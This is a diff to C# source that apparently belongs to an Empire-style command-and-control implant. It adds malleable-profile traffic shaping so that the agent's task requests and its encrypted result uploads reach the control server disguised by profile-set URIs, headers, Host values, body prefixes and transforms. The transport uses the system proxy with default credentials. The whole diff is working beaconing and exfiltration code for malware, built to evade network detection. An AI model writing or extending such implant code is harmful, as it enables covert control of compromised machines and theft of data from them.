@@ -255,10 +255,24 @@ AESc = AES encrypted using the client's session key
 
         internal byte[] GetTask()
         {
+            byte[] routingPacket = NewRoutingPacket(null, 4);
+
+            byte[] malleableResult;
+            bool malleableUsed = TryMalleableRequest(routingPacket, null, false, out malleableResult);
+            if (malleableUsed)
+            {
+                if (malleableResult == null) return null;
+                string mStr = System.Text.Encoding.UTF8.GetString(malleableResult);
+                if (mStr.TrimStart().StartsWith("<!DOCTYPE", StringComparison.OrdinalIgnoreCase))
+                {
+                    return null;
+                }
+                return malleableResult;
+            }
+
             byte[] results = new byte[0];
             try
             {
-                byte[] routingPacket = NewRoutingPacket(null, 4);
                 string routingCookie = Convert.ToBase64String(routingPacket);
 
                 WebClient webClient = new WebClient();
@@ -293,6 +307,12 @@ AESc = AES encrypted using the client's session key
             byte[] encryptedBytes = EmpireStager.AesEncryptThenHmac(sessionInfo.GetSessionKeyBytes(), packets);
             byte[] routingPacket = NewRoutingPacket(encryptedBytes, 5);
 
+            byte[] unused;
+            if (TryMalleableRequest(routingPacket, encryptedBytes, true, out unused))
+            {
+                return;
+            }
+
             Random random = new Random();
             string controlServer = sessionInfo.GetControlServers()[random.Next(sessionInfo.GetControlServers().Length)];
 
@@ -311,6 +331,245 @@ AESc = AES encrypted using the client's session key
                 catch (WebException) { }
             }
 
+        }
+
+        // Issues a request according to a runtime malleable profile. Returns
+        // true if the profile was present and the request was attempted (even
+        // if it failed) — callers should NOT fall back to the legacy path in
+        // that case. Returns false when no profile is configured or the
+        // section is malformed, signaling the caller to use the hardcoded
+        // behavior.
+        //
+        // For POST, `outputPayload` is the encrypted client packet bytes that
+        // should be placed through the client.output container, while
+        // `routingPacket` goes through client.metadata. For GET, only the
+        // routing packet is sent.
+        private bool TryMalleableRequest(byte[] routingPacket, byte[] outputPayload, bool isPost, out byte[] responseBytes)
+        {
+            responseBytes = null;
+            MalleableProfile mp = sessionInfo.GetMalleableProfile();
+            if (mp == null || mp.Sections == null) return false;
+
+            string sectionName = isPost ? "post" : "get";
+            Section section;
+            if (!mp.Sections.TryGetValue(sectionName, out section) || section == null) return false;
+            if (section.Client == null || section.Client.Uris == null || section.Client.Uris.Length == 0) return false;
+            if (section.Client.Metadata == null) return false;
+
+            try
+            {
+                Random random = new Random();
+                string controlServer = sessionInfo.GetControlServers()[random.Next(sessionInfo.GetControlServers().Length)];
+                if (controlServer.EndsWith("/")) controlServer = controlServer.Substring(0, controlServer.Length - 1);
+                string uri = section.Client.Uris[random.Next(section.Client.Uris.Length)];
+
+                // Seed with the static parameters from the profile before any
+                // parameter terminator appends its piece.
+                string requestUri = controlServer + uri;
+                if (section.Client.Parameters != null && section.Client.Parameters.Count > 0)
+                {
+                    StringBuilder qs = new StringBuilder();
+                    bool first = requestUri.IndexOf('?') < 0;
+                    foreach (KeyValuePair<string, string> kv in section.Client.Parameters)
+                    {
+                        qs.Append(first ? '?' : '&');
+                        first = false;
+                        qs.Append(Uri.EscapeDataString(kv.Key));
+                        qs.Append('=');
+                        qs.Append(Uri.EscapeDataString(kv.Value ?? ""));
+                    }
+                    requestUri += qs.ToString();
+                }
+
+                // Seed the body from the static profile body (base64-encoded).
+                byte[] staticBody = DecodeBase64Loose(section.Client.Body);
+
+                // We have to construct the request after URI rewrites, so stash
+                // pending terminator placements and commit them below.
+                byte[] metadataBytes = MalleableTransform.Apply(section.Client.Metadata.Transforms, routingPacket ?? new byte[0]);
+                byte[] outputBytes = null;
+                if (isPost && section.Client.Output != null)
+                {
+                    byte[] payload = outputPayload ?? new byte[0];
+                    outputBytes = MalleableTransform.Apply(section.Client.Output.Transforms, payload);
+                }
+
+                // URI-mutating terminators need to run before we create the
+                // HttpWebRequest (immutable URL once constructed). We apply
+                // them in-place, falling through to body/header placement after.
+                ApplyUriTerminator(section.Client.Metadata.Terminator, metadataBytes, ref requestUri);
+                if (outputBytes != null)
+                {
+                    ApplyUriTerminator(section.Client.Output.Terminator, outputBytes, ref requestUri);
+                }
+
+                HttpWebRequest req = (HttpWebRequest)WebRequest.Create(requestUri);
+                req.Method = string.IsNullOrEmpty(section.Client.Verb) ? (isPost ? "POST" : "GET") : section.Client.Verb;
+                req.Proxy = WebRequest.GetSystemWebProxy();
+                req.Proxy.Credentials = CredentialCache.DefaultCredentials;
+
+                // Static headers first — terminator-stored headers will overwrite
+                // if they collide.
+                if (section.Client.Headers != null)
+                {
+                    foreach (KeyValuePair<string, string> kv in section.Client.Headers)
+                    {
+                        ApplyStaticHeader(req, kv.Key, kv.Value);
+                    }
+                }
+
+                // Body starts as the static body_prefix; PRINT terminators below
+                // will append to it by writing combined bytes.
+                byte[] bodyAccumulator = staticBody ?? new byte[0];
+
+                bodyAccumulator = PlaceNonUriTerminator(req, section.Client.Metadata.Terminator, metadataBytes, bodyAccumulator);
+                if (outputBytes != null)
+                {
+                    bodyAccumulator = PlaceNonUriTerminator(req, section.Client.Output.Terminator, outputBytes, bodyAccumulator);
+                }
+
+                // Commit the body once — if any PRINT terminator fired, we have
+                // accumulated bytes; otherwise bodyAccumulator == staticBody.
+                if (bodyAccumulator != null && bodyAccumulator.Length > 0)
+                {
+                    req.ContentLength = bodyAccumulator.Length;
+                    using (Stream s = req.GetRequestStream())
+                    {
+                        s.Write(bodyAccumulator, 0, bodyAccumulator.Length);
+                    }
+                }
+
+                using (HttpWebResponse resp = (HttpWebResponse)req.GetResponse())
+                {
+                    if (section.Server != null && section.Server.Output != null)
+                    {
+                        byte[] extracted = MalleableTransform.ExtractTerminator(resp, section.Server.Output.Terminator, section.Client.Uris);
+                        // Strip the server's body_prefix if present — the server
+                        // prepends it before the transformed payload.
+                        byte[] prefix = DecodeBase64Loose(section.Server.BodyPrefix);
+                        if (section.Server.Output.Terminator != null &&
+                            (section.Server.Output.Terminator.Type == null ||
+                             string.Equals(section.Server.Output.Terminator.Type, "print", StringComparison.OrdinalIgnoreCase) ||
+                             section.Server.Output.Terminator.Type == "") &&
+                            prefix.Length > 0 && extracted.Length >= prefix.Length)
+                        {
+                            byte[] trimmed = new byte[extracted.Length - prefix.Length];
+                            Buffer.BlockCopy(extracted, prefix.Length, trimmed, 0, trimmed.Length);
+                            extracted = trimmed;
+                        }
+                        responseBytes = MalleableTransform.Reverse(section.Server.Output.Transforms, extracted);
+                    }
+                    else
+                    {
+                        using (Stream rs = resp.GetResponseStream())
+                        {
+                            using (MemoryStream ms = new MemoryStream())
+                            {
+                                if (rs != null)
+                                {
+                                    byte[] buf = new byte[4096];
+                                    int n;
+                                    while ((n = rs.Read(buf, 0, buf.Length)) > 0) ms.Write(buf, 0, n);
+                                }
+                                responseBytes = ms.ToArray();
+                            }
+                        }
+                    }
+                }
+                return true;
+            }
+            catch (WebException)
+            {
+                // Preserve legacy side effect: GET increments missed checkins,
+                // POST silently swallows.
+                if (!isPost) MissedCheckins++;
+                responseBytes = null;
+                return true;
+            }
+            catch (Exception)
+            {
+                // Any non-network failure (e.g. profile ops too narrow) also
+                // counts as "attempted" — don't silently revert to legacy so
+                // the operator notices the profile is broken rather than
+                // leaking plaintext metadata via the hardcoded cookie.
+                if (!isPost) MissedCheckins++;
+                responseBytes = null;
+                return true;
+            }
+        }
+
+        private static void ApplyUriTerminator(Terminator term, byte[] data, ref string requestUri)
+        {
+            if (term == null || string.IsNullOrEmpty(term.Type)) return;
+            string t = term.Type.ToLowerInvariant();
+            if (t == "parameter" || t == "uri-append")
+            {
+                MalleableTransform.StoreTerminator(null, data, term, ref requestUri);
+            }
+        }
+
+        // Applies header and PRINT terminators. For PRINT, we accumulate into
+        // bodyAccumulator and commit once at the end so multiple PRINT
+        // containers (metadata + output on POST) concatenate cleanly.
+        private static byte[] PlaceNonUriTerminator(HttpWebRequest req, Terminator term, byte[] data, byte[] bodyAccumulator)
+        {
+            if (term == null || string.IsNullOrEmpty(term.Type)) return bodyAccumulator;
+            string t = term.Type.ToLowerInvariant();
+            if (t == "header")
+            {
+                string placeholder = null;
+                MalleableTransform.StoreTerminator(req, data, term, ref placeholder);
+                return bodyAccumulator;
+            }
+            if (t == "print" || t == "")
+            {
+                byte[] combined = new byte[bodyAccumulator.Length + data.Length];
+                Buffer.BlockCopy(bodyAccumulator, 0, combined, 0, bodyAccumulator.Length);
+                Buffer.BlockCopy(data, 0, combined, bodyAccumulator.Length, data.Length);
+                return combined;
+            }
+            return bodyAccumulator;
+        }
+
+        private static void ApplyStaticHeader(HttpWebRequest req, string name, string value)
+        {
+            if (string.IsNullOrEmpty(name)) return;
+            if (value == null) value = "";
+            switch (name.ToLowerInvariant())
+            {
+                case "user-agent": req.UserAgent = value; break;
+                case "accept": req.Accept = value; break;
+                case "referer": req.Referer = value; break;
+                case "content-type": req.ContentType = value; break;
+                case "host": req.Host = value; break;
+                case "connection":
+                case "content-length":
+                case "transfer-encoding":
+                case "expect":
+                case "date":
+                case "if-modified-since":
+                case "range":
+                    // Managed by the framework — skip.
+                    break;
+                default:
+                    req.Headers[name] = value;
+                    break;
+            }
+        }
+
+        private static byte[] DecodeBase64Loose(string s)
+        {
+            if (string.IsNullOrEmpty(s)) return new byte[0];
+            try
+            {
+                int pad = s.Length % 4;
+                if (pad != 0) s = s + new string('=', 4 - pad);
+                return Convert.FromBase64String(s);
+            }
+            catch (FormatException)
+            {
+                return new byte[0];
+            }
         }
 
         private void ProcessTaskingPackets(byte[] encryptedTask)
